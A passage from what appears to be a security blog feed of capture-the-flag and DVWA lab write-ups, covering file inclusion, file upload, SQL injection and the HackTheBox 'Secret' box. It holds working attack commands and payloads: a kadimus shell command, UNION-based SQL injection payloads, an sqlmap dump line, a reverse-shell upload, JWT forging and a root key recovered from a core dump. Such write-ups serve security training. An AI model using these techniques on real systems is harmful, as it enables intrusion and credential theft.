</pre></td><td class="rouge-code"><pre>kadimus <span class="nt">-u</span> <span class="s1">'http://buster/dvwa/vulnerabilities/fi/?page=include.php'</span> <span class="nt">--cookie</span> <span class="s1">'security=low; PHPSESSID=p40eq58f52c6e08rku3gb6leb8'</span> <span class="nt">-T</span> data <span class="nt">--parameter</span> page <span class="nt">--shell</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>This gave me a shell on the box;</p>

<p><img src="/assets/img/20220327092942.png" alt="" /></p>

<p>The shell you get with <code class="language-plaintext highlighter-rouge">kadimus</code> is stateless, so you may want to upgrade to a proper shell as soon as you have code execution;</p>

<p><img src="/assets/img/20220327093253.png" alt="" /></p>]]></content><author><name></name></author><category term="dvwa" /><category term="dvwa" /><category term="lfi" /><category term="rfi" /><category term="rce" /><category term="kadiums" /><summary type="html"><![CDATA[This is an exercise in OWASP DVWA for local and remote file inclusion.]]></summary></entry><entry><title type="html">File Upload- DVWA</title><link href="https://4g3nt47.github.io/posts/dvwa/dvwa_file_upload.html" rel="alternate" type="text/html" title="File Upload- DVWA" /><published>2022-03-27T00:00:00+01:00</published><updated>2022-03-27T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/dvwa/dvwa_file_upload</id><content type="html" xml:base="https://4g3nt47.github.io/posts/dvwa/dvwa_file_upload.html"><![CDATA[<p>This is an exercise in OWASP DVWA for exploiting file upload vulnerabilities.</p>

<p><br /></p>

<h3 id="file-upload---dvwa">File Upload - DVWA</h3>
<p><br /></p>

<h4 id="difficulty-easy">Difficulty: Easy</h4>
<p><br /></p>

<p>In this mode, we are presented with a file upload form;</p>

<p><img src="/assets/img/20220324202555.png" alt="" /></p>

<p>As expected, there is no filter, and I was able to upload a PHP code that execute a bash reverse shell;</p>

<p><img src="/assets/img/20220324203110.png" alt="" /></p>

<p>The web application is kind enough to give us the path of the upload. Going to the URL, I got a shell on the box;</p>

<p><img src="/assets/img/20220324203321.png" alt="" /></p>

<p><img src="/assets/img/20220324203255.png" alt="" /></p>

<p><br /></p>

<h4 id="difficulty-medium">Difficulty: Medium</h4>
<p><br /></p>

<p>Attempt to upload a PHP file failed, saying only JPEG or PNG images are accepted;</p>

<p><img src="/assets/img/20220324203601.png" alt="" /></p>

<p>This means the web application is now filtering our uploads, which means we need to play around with the upload request. <code class="language-plaintext highlighter-rouge">mitmproxy</code> does not work well with multipart forms in my experience, so I fired up burp, and this is what a failed upload of a PHP file look like;</p>

<p><img src="/assets/img/20220324205409.png" alt="" /></p>

<p>Changing the <code class="language-plaintext highlighter-rouge">Content-Type</code> parameter to <code class="language-plaintext highlighter-rouge">image/png</code> successfully bypassed the filter, and gave us code execution;</p>

<p><img src="/assets/img/20220324205549.png" alt="" /></p>

<p><img src="/assets/img/20220324205650.png" alt="" /></p>

<p><br /></p>

<h4 id="difficuly-hard">Difficuly: Hard</h4>
<p><br /></p>

<p>In this mode, the application appears to be filtering files based on their contents because changing the file extension, as well as the value of the <code class="language-plaintext highlighter-rouge">Content-Type</code> parameter didn’t work;</p>

<p><img src="/assets/img/20220324210238.png" alt="" /></p>

<p>A good way to get around this is using <em>magic bytes</em>, which are series of bytes, normally at the beginning of a file, that are unique to that file type. So I created a normal PNG file named <code class="language-plaintext highlighter-rouge">test.png</code>, and used <code class="language-plaintext highlighter-rouge">head</code> to extract the first 20 bytes it has and prefixed it to our PHP payload;</p>

<p><img src="/assets/img/20220324210755.png" alt="" /></p>

<p>This approach worked, but the web app is also filtering file extension, so I was unable to gain code execution. However, this can still be exploited to gain code execution by chaining it with the LFI vuln in DVWA.</p>]]></content><author><name></name></author><category term="dvwa" /><category term="dvwa" /><category term="file upload" /><category term="rce" /><category term="magic bytes" /><summary type="html"><![CDATA[This is an exercise in OWASP DVWA for exploiting file upload vulnerabilities.]]></summary></entry><entry><title type="html">Error-based SQL Injection- DVWA</title><link href="https://4g3nt47.github.io/posts/dvwa/dvwa_sqli_error_based.html" rel="alternate" type="text/html" title="Error-based SQL Injection- DVWA" /><published>2022-03-27T00:00:00+01:00</published><updated>2022-03-27T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/dvwa/dvwa_sqli_error_based</id><content type="html" xml:base="https://4g3nt47.github.io/posts/dvwa/dvwa_sqli_error_based.html"><![CDATA[<p>This is an exercise in OWASP DVWA for exploiting SQL injection.</p>

<p><br /></p>

<h3 id="error-based-sql-injection---dvwa">Error-based SQL Injection - DVWA</h3>
<p><br /></p>

<h4 id="difficulty-easy">Difficulty: Easy</h4>
<p><br /></p>

<p>In this mode, we are presented with a form to enter a user ID, which is used to display the first name and surname of a user;</p>

<p><img src="/assets/img/20220327073156.png" alt="" /></p>

<p><img src="/assets/img/20220327073215.png" alt="" /></p>

<p>Adding a single quote to the input gave an SQL error;</p>

<p><img src="/assets/img/20220327073331.png" alt="" /></p>

<p>This means we have an <em>error-based SQL injection</em>. The payload <code class="language-plaintext highlighter-rouge">1' order by 2-- -</code> didn’t give any error, but <code class="language-plaintext highlighter-rouge">1' order by 3-- -</code> did, which means the query we are injecting to is retrieving <strong>2</strong> columns. Injecting a <em>union</em> query showed that both columns are reflected in the response;</p>

<p><img src="/assets/img/20220327073838.png" alt="" /></p>

<p>Name of the current database;</p>

<p><img src="/assets/img/20220327073933.png" alt="" /></p>

<p>Existing databases;</p>

<p><img src="/assets/img/20220327074422.png" alt="" /></p>

<p>Tables in <code class="language-plaintext highlighter-rouge">dvwa</code> databases;</p>

<p><img src="/assets/img/20220327074739.png" alt="" /></p>

<p><code class="language-plaintext highlighter-rouge">users</code> looks interesting. Let’s see what columns it have;</p>

<p><img src="/assets/img/20220327074942.png" alt="" /></p>

<p>Looks like this table is used to store user credentials;</p>

<p><img src="/assets/img/20220327075345.png" alt="" /></p>

<p>I copied these hashes to a format <code class="language-plaintext highlighter-rouge">john</code> can process, and was able to crack them;</p>

<p><img src="/assets/img/20220327075721.png" alt="" /></p>

<p><br /></p>

<h4 id="difficulty-medium">Difficulty: Medium</h4>
<p><br /></p>

<p>In this mode, the form is different. It uses a set of predefined user IDs as input;</p>

<p><img src="/assets/img/20220327080027.png" alt="" /></p>

<p>This means we will have to rely on a proxy for injection. Intercepting the request in <code class="language-plaintext highlighter-rouge">mitmproxy</code> and testing for SQL injection using a single quote gave an error;</p>

<p><img src="/assets/img/20220327080425.png" alt="" /></p>

<p>Same thing happens when injecting with double quotes. Injecting without any quote worked, which means the application is likely injecting the user input directly without enclosing in quote, which will work since the developer expects the input to be an integer;</p>

<p><img src="/assets/img/20220327080751.png" alt="" /></p>

<p>This injection can be exploited much more conveniently using tools like <code class="language-plaintext highlighter-rouge">sqlmap</code>, and I was able to use it to dump the hashes in the <code class="language-plaintext highlighter-rouge">users</code> table;</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>sqlmap <span class="nt">-u</span> <span class="s1">'http://buster/dvwa/vulnerabilities/sqli/'</span> <span class="nt">--data</span> <span class="s1">'id=1&amp;Submit=Submit'</span> <span class="nt">--cookie</span> <span class="s1">'security=medium; PHPSESSID=5c8siun1tr567gd519v1mivcbi'</span> <span class="nt">-D</span> dvwa <span class="nt">-T</span> <span class="nb">users</span> <span class="nt">--dump</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p><img src="/assets/img/20220327081759.png" alt="" /></p>

<p><br /></p>

<h4 id="difficulty-high">Difficulty: High</h4>
<p><br /></p>

<table>
  <tbody>
    <tr>
      <td>This mode also gives a different form. The payload used in [[06 - SQL Injection - Error-based#Difficulty Easy</td>
      <td>easy mode]] also worked in this mode, the only twist is that a seperate window is created in browser for user input, while the results are displayed in the main window;</td>
    </tr>
  </tbody>
</table>

<p><img src="/assets/img/20220327082145.png" alt="" /></p>]]></content><author><name></name></author><category term="dvwa" /><category term="dvwa" /><category term="sql injection" /><category term="sqlmap" /><summary type="html"><![CDATA[This is an exercise in OWASP DVWA for exploiting SQL injection.]]></summary></entry><entry><title type="html">Secret - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/secret.html" rel="alternate" type="text/html" title="Secret - HackTheBox" /><published>2022-03-26T00:00:00+01:00</published><updated>2022-03-26T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/secret</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/secret.html"><![CDATA[<p><strong>Secret</strong> is an easy linux box where you have to exploit a <em>sensitive information</em> leak in a git repo to recover a JWT secret, which allows you to forge a JWT token that gives you access to an API endpoint that’s vulnerable to <em>command injection</em>. Once on the box, you will be exploiting a custom SUID binary that allows for core dumping.</p>

<p><br /></p>

<h3 id="info">Info</h3>
<p><br /></p>

<p><img src="/assets/img/20211031081337.png" alt="" /></p>

<p><img src="/assets/img/20211031081355.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="recon">Recon</h3>
<p><br /></p>

<h4 id="nmap">NMAP</h4>

<pre><code class="language-raw"># Nmap 7.70 scan initiated Sat Oct 30 20:00:45 2021 as: nmap -sV -sC -v -oN nmap.txt 10.10.11.120
Nmap scan report for secret.htb (10.10.11.120)
Host is up (0.25s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: DUMB Docs
3000/tcp open  http    Node.js (Express middleware)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: DUMB Docs
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Oct 30 20:01:41 2021 -- 1 IP address (1 host up) scanned in 56.17 seconds
</code></pre>

<h4 id="web">Web</h4>

<p><img src="/assets/img/20211031081510.png" alt="" /></p>

<p><img src="/assets/img/20211031082706.png" alt="" /></p>

<p>The <code class="language-plaintext highlighter-rouge">/doc</code> path in the website provides a demo for creating and accessing accounts using the API;</p>

<p><img src="/assets/img/20211031081706.png" alt="" /></p>

<p>Possible credential?</p>

<p><img src="/assets/img/20211031081811.png" alt="" /></p>

<p>Account login;</p>

<p><img src="/assets/img/20211031081837.png" alt="" /></p>

<p>There is a link to download source code in the homepage;</p>

<p><img src="/assets/img/20211031081959.png" alt="" /></p>

<p>It is a ZIP file, which I download and extract. It contains a <code class="language-plaintext highlighter-rouge">.git</code> folder in the root, so it’s a GIT repository. Running <code class="language-plaintext highlighter-rouge">git log</code> command showed something interesting;</p>

<p><img src="/assets/img/20211031082300.png" alt="" /></p>

<p>So I ran the <code class="language-plaintext highlighter-rouge">git diff</code> command using the commit ID to see what changes were made, and I got the token used to sign JWT tokens as indicated by the file <code class="language-plaintext highlighter-rouge">routes/verifytoken.js</code>;</p>

<p><img src="/assets/img/20211031082359.png" alt="" /></p>

<p><img src="/assets/img/20211031082447.png" alt="" /></p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">jwt</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">jsonwebtoken</span><span class="dl">"</span><span class="p">);</span>

<span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">const</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">header</span><span class="p">(</span><span class="dl">"</span><span class="s2">auth-token</span><span class="dl">"</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">token</span><span class="p">)</span> <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">401</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="dl">"</span><span class="s2">Access Denied</span><span class="dl">"</span><span class="p">);</span>

    <span class="k">try</span> <span class="p">{</span>
        <span class="kd">const</span> <span class="nx">verified</span> <span class="o">=</span> <span class="nx">jwt</span><span class="p">.</span><span class="nx">verify</span><span class="p">(</span><span class="nx">token</span><span class="p">,</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">TOKEN_SECRET</span><span class="p">);</span>
        <span class="nx">req</span><span class="p">.</span><span class="nx">user</span> <span class="o">=</span> <span class="nx">verified</span><span class="p">;</span>
        <span class="nx">next</span><span class="p">();</span>
    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="dl">"</span><span class="s2">Invalid Token</span><span class="dl">"</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">};</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>The login API is also vulnerable to user enumeration as login attempt using a valid email with a bad password said <strong>Password is wrong</strong>, while attempt with invalid email says <strong>Email is wrong</strong>.</p>

<p><br /></p>

<hr />
<h3 id="foothold">Foothold</h3>
<p><br /></p>

<p>Using <em>Burp Suite</em>, I was able to create an account using the following request;</p>

<p><img src="/assets/img/20211031084145.png" alt="" /></p>

<p>Logging into the account gave me a token, which I forged on https://jwt.io using the JWT secret obtained, and changed the username to <code class="language-plaintext highlighter-rouge">theadmin</code> (the administrative username obtained by going through the source files). Using the forged token, request to <code class="language-plaintext highlighter-rouge">/api/priv</code> showed I am now the admin;</p>

<p><img src="/assets/img/20211031084644.png" alt="" /></p>

<p>I am now authenticated as an admin, but still have no idea how to utilise the API.</p>

<p>Using the <code class="language-plaintext highlighter-rouge">package.json</code> file in the root of the repo, which contains dependencies of the project and their version numbers, I started looking for exploits online, but couldn’t find anything interesting. So I continue to enumerate previous commits using <code class="language-plaintext highlighter-rouge">git diff</code>, and found an interesting commit with the ID <code class="language-plaintext highlighter-rouge">e297a2797a5f62b6011654cf6fb6ccb6712d2d5b</code>;</p>

<p><img src="/assets/img/20211031100641.png" alt="" /></p>

<p>That looks like a shell command that can be exploited if I can control the value of <code class="language-plaintext highlighter-rouge">req.query.file</code>. Crafting a request in <em>Burp Suite</em> for the endpoint, I got this;</p>

<p><img src="/assets/img/20211031101119.png" alt="" /></p>

<p>I assumed <code class="language-plaintext highlighter-rouge">req.query</code> is used to store all queries defined in the request, so I added a GET parameter named <code class="language-plaintext highlighter-rouge">file</code> with a test value, and it got included in the command;</p>

<p><img src="/assets/img/20211031101334.png" alt="" /></p>

<p>Injecting an encoded bash reverse shell in the <code class="language-plaintext highlighter-rouge">file</code> parameter, I got a shell as the user <strong>dasith</strong>;</p>

<p><img src="/assets/img/20211031101959.png" alt="" /></p>

<p><img src="/assets/img/20211031102057.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="privesc">PrivEsc</h3>
<p><br /></p>

<p>Can’t list sudo permissions for the user as I still don’t have his password. <code class="language-plaintext highlighter-rouge">netstat</code> showed a service running locally, which was identified as <em>MongoDB</em> using <code class="language-plaintext highlighter-rouge">telnet</code>;</p>

<p><img src="/assets/img/20211031102910.png" alt="" /></p>

<p>Checking the <code class="language-plaintext highlighter-rouge">.env</code> file, I got a path for the service;</p>

<p><img src="/assets/img/20211031103224.png" alt="" /></p>

<p>The user does not have SSH public key authentication setup, so I used <code class="language-plaintext highlighter-rouge">ssh-keygen</code> to setup one, so I can setup port-forwarding to the MongoDB service over SSH. I still got the same error when trying to access the MongoDB service over HTTP.</p>

<p>After reading up on <em>MongoDB</em>, I found a cheatsheet at https://gist.github.com/michaeltreat/d3bdc989b54cff969df86484e091fd0c that helped me enumerate the service. I found a database named <code class="language-plaintext highlighter-rouge">web-auth</code> containing four (4) hashes;</p>

<p><img src="/assets/img/20211031104847.png" alt="" /></p>

<p><img src="/assets/img/20211031104911.png" alt="" /></p>

<p>Attempt to crack the hashes using <code class="language-plaintext highlighter-rouge">john</code> was taking way too long, so I aborted it and move on. One of the hashes was eventually cracked, but didn’t give me access to anything.</p>

<p>Inside <code class="language-plaintext highlighter-rouge">/opt/</code>, I found a SUID binary owned by root, and what looks like the source code. Running it, it asks for a filename, and then report some stats for the file;</p>

<p><img src="/assets/img/20211031110157.png" alt="" /></p>

<p>Privileges are dropped when saving results, which means I can’t write anything to protected paths. Attempts to step through the process while loading protected files using <code class="language-plaintext highlighter-rouge">strace</code> and <code class="language-plaintext highlighter-rouge">gdb</code> failed because they can’t attach to a process of higher privileges.</p>

<p>Going through the source code, I noticed core dumping was enabled;</p>

<p><img src="/assets/img/20211101174829.png" alt="" /></p>

<p>Fuzzing the program’s input did not cause the program to crash. After taking a sanity check, I realized I could cause a program to crash and dump core by sending it a SIGSEGV (signal ID: 11). Running <code class="language-plaintext highlighter-rouge">kill -n 11 &lt;PID&gt;</code> while the program is asking where the results should be saved, I was able to crash it;</p>

<p><img src="/assets/img/20211101175418.png" alt="" /></p>

<p>Checking <code class="language-plaintext highlighter-rouge">/var/crash</code>, I found the crash file generated;</p>

<p><img src="/assets/img/20211101175510.png" alt="" /></p>

<p>After googling around, I learned that such crash files can be processed using <code class="language-plaintext highlighter-rouge">apport-unpack</code> tool, so I did;</p>

<p><img src="/assets/img/20211101175648.png" alt="" /></p>

<p>The file <code class="language-plaintext highlighter-rouge">CoreDump</code> was identified as the core dump;</p>

<p><img src="/assets/img/20211101175813.png" alt="" /></p>

<p>So I load it in the <code class="language-plaintext highlighter-rouge">gdb</code> installed on the host, and searched the memory mappings of the program using the<code class="language-plaintext highlighter-rouge">find</code> command, and manually go through the stack using <code class="language-plaintext highlighter-rouge">x/s &lt;some-address&gt;</code>, but could only locate the name of the file (<code class="language-plaintext highlighter-rouge">/root/.ssh/id_rsa</code>) that was given to the SUID binary before the crash. With the help of the <code class="language-plaintext highlighter-rouge">strings</code> command-line tool, I was able to extract the private key of <code class="language-plaintext highlighter-rouge">root</code> (which was the file given to the binary before the crash);</p>

<p><img src="/assets/img/20211101180210.png" alt="" /></p>

<p>I used the key to gain access to the box as <code class="language-plaintext highlighter-rouge">root</code> over SSH;</p>

<p><img src="/assets/img/20211101180443.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="summary">Summary</h3>
<p><br /></p>

<ul>
  <li>Identified running services with <code class="language-plaintext highlighter-rouge">nmap</code></li>
  <li>Used the documentation to create an account on the web API.</li>
  <li>Found the JWT token signing key in a previous commit in the source files using <code class="language-plaintext highlighter-rouge">git diff</code>, and used it to forge a token for the admin user.</li>
  <li>Found the path <code class="language-plaintext highlighter-rouge">/api/logs</code> that’s accessible only to admins is vulnerable to command injection, which I exploited to gain access to the box as the user <code class="language-plaintext highlighter-rouge">dasith</code></li>
  <li>Inside the box as <code class="language-plaintext highlighter-rouge">dasith</code>;
    <ul>
      <li>Exploited a SUID binary by causing it to core dump after reading the private SSH key of the root user.</li>
      <li>Retrieved the SSH key in the crash file using <code class="language-plaintext highlighter-rouge">apport-unpack</code> and <code class="language-plaintext highlighter-rouge">strings</code>, and gained root access to the box over SSH.</li>
    </ul>
  </li>
</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="linux" /><category term="api" /><category term="nodejs" /><category term="static analysis" /><category term="git" /><category term="jwt" /><category term="command injection" /><category term="information disclosure" /><category term="tunneling" /><category term="apport" /><category term="custom exploitation" /><summary type="html"><![CDATA[Secret is an easy linux box where you have to exploit a sensitive information leak in a git repo to recover a JWT secret, which allows you to forge a JWT token that gives you access to an API endpoint that’s vulnerable to command injection. Once on the box, you will be exploiting a custom SUID binary that allows for core dumping.]]></summary></entry></feed>